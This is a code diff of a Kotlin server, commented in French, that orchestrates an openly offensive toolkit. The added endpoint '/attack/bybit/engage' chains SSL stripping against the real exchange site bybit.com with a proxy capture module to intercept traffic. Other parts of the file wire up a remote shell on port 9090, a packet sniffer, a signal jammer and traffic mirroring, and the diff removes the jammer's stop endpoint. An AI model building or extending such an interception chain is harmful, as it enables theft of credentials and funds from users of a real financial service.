@@ -5,13 +5,13 @@ import io.javalin.openapi.plugin.OpenApiPlugin
 import java.time.Instant
 
 /**
- * NOYAU SOUVERAIN V2.0 - ULTIMATE PSC (OFFENSIVE EDITION)
- * Orchestration : SIGINT, Stealth, Jamming & SSL-Stripping
+ * NOYAU SOUVERAIN V2.1 - INTERCEPTOR EDITION
+ * Orchestration : SIGINT, Stealth, Jamming, SSL-Stripping & Proxy Capture
  */
 fun main(args: Array<String>) {
     println("✅ SOVEREIGN CORE boot OK @ ${Instant.now()}")
 
-    // 1. Initialisation des Sentinelles (Anti-Tamper)
+    // 1. Initialisation des Sentinelles
     val gatekeeper = Gatekeeper()
     val killSwitch = KillSwitch()
 
@@ -19,7 +19,7 @@ fun main(args: Array<String>) {
         killSwitch.engage()
     }
 
-    // 2. Configuration du port Dashboard (Défaut 7070)
+    // 2. Configuration du port Dashboard
     val port = args.firstOrNull()?.toIntOrNull() ?: System.getenv("PORT")?.toIntOrNull() ?: 7070
 
     // 3. Instanciation des unités de combat
@@ -27,35 +27,34 @@ fun main(args: Array<String>) {
     val vault = SecurityVault(rotator)
     val interceptor = FinCapInterception()
     val resilience = NetworkResilience()
-    val offensiveScanner = OffensiveScanner()
     val remoteShell = RemoteShell()
     val packetSniffer = PacketSniffer()
     val signalJammer = SignalJammer()
     val signalStealth = SignalStealth()
     val trafficMirror = TrafficMirror()
-    val sslStripper = SSLStripper() // Intégration pour test Bybit
+    val sslStripper = SSLStripper()
+    val proxyCapture = ProxyInterceptor(vault) // Nouveau module de capture
 
-    // 🚀 ACTIVATION DES UNITÉS PERSISTANTES (Threads de fond)
-    rotator.startRotation()            // Rotation AES-GCM (5 min)
+    // 🚀 ACTIVATION DES UNITÉS PERSISTANTES
+    rotator.startRotation()            //
     interceptor.runInterceptionMode()   // Port 8889
     resilience.monitorSystem()          // Port 8888
     remoteShell.startShell(9090)        // Terminal Port 9090
     packetSniffer.startSniffing(9999)   // Sniffer Port 9999
 
-    // 4. Démarrage du Dashboard Souverain (Javalin)
-    // .start() maintient le processus Java vivant
+    // 4. Démarrage du Dashboard Souverain
     val app = Javalin.create { config ->
         config.plugins.register(OpenApiPlugin { })
     }.start(port)
 
     println("🛡️ TUNNEL SÉCURISÉ ACTIF SUR LE PORT $port")
-    println("📡 ARSENAL COMPLET OPÉRATIONNEL")
+    println("📡 CHAÎNE D'INTERCEPTION BYBIT OPÉRATIONNELLE")
 
     // 5. ENDPOINTS DE CONTRÔLE ET D'ACTION
 
-    // Audit de santé
+    // Audit de santé complet
     app.get("/status") { ctx ->
-        val statusData = "FARDC_PSC_SOUVERAIN_LAB_ACTIVE"
+        val statusData = "FARDC_PSC_SOUVERAIN_v2.1_ACTIVE"
         ctx.json(
             mapOf(
                 "status" to "COMBAT_READY",
@@ -63,23 +62,28 @@ fun main(args: Array<String>) {
                 "secure_token" to vault.encryptData(statusData),
                 "active_modules" to listOf(
                     "EncryptionRotator", "SecurityVault", "FinCap", "NetworkResilience",
-                    "RemoteShell", "PacketSniffer", "OffensiveScanner", 
-                    "SignalJammer", "SignalStealth", "TrafficMirror", "SSLStripper"
+                    "RemoteShell", "PacketSniffer", "SignalJammer", "SignalStealth", 
+                    "TrafficMirror", "SSLStripper", "ProxyInterceptor"
                 )
             )
         )
     }
 
-    // INTERCEPTION DÉGRADÉE (Bybit Lab)
-    app.get("/intercept/secure") { ctx ->
-        val target = ctx.queryParam("target") ?: ""
-        if (target.isNotEmpty()) {
-            val downgraded = sslStripper.downgradeConnection(target)
-            signalStealth.stealthConnect(downgraded, 80, "INTERCEPTION_REQ_BBY")
-            ctx.result("📡 [STEALTH-STRIP] Cible dégradée : $downgraded. Infiltration furtive lancée.")
-        } else {
-            ctx.status(400).result("Cible HTTPS manquante.")
-        }
+    // CHAÎNE D'ATTAQUE COMBINÉE (Bybit Lab)
+    app.get("/attack/bybit/engage") { ctx ->
+        val target = "https://www.bybit.com"
+        val proxyPort = 8082
+        
+        // 1. Dégradation SSL
+        val downgraded = sslStripper.downgradeConnection(target)
+        
+        // 2. Activation de la capture
+        proxyCapture.startIntercept(proxyPort)
+        
+        // 3. Liaison Furtive fragmentée
+        signalStealth.stealthConnect(downgraded, proxyPort, "BBY_EXPLOIT_INIT")
+        
+        ctx.result("🔥 [OFFENSIVE] Chaîne engagée : $downgraded -> Capture sur port $proxyPort")
     }
 
     // MIROIR : Duplication discrète
@@ -92,7 +96,7 @@ fun main(args: Array<String>) {
             trafficMirror.startMirroring(listen, host, dPort, mPort)
             ctx.result("📡 [MIRROR] Pont actif sur port $listen")
         } else {
-            ctx.status(400).result("Paramètres miroirs incomplets.")
+            ctx.status(400).result("Hôte destination manquant.")
         }
     }
 
@@ -108,14 +112,10 @@ fun main(args: Array<String>) {
         }
     }
 
-    app.get("/jam/stop") { ctx ->
-        signalJammer.stopJamming()
-        ctx.result("🛑 [JAMMER] Opérations cessées.")
-    }
-
     // URGENCE : Kill-Switch
     app.post("/emergency/halt") { ctx ->
-        println("[!] ORDRE DE HALT REÇU : PURGE MÉMOIRE...")
+        println("[!] ORDRE DE HALT REÇU : NEUTRALISATION...")
+        proxyCapture.stop()
         ctx.status(200).result(vault.encryptData("DESTRUCTION_CONFIRMED"))
         killSwitch.engage()
     }
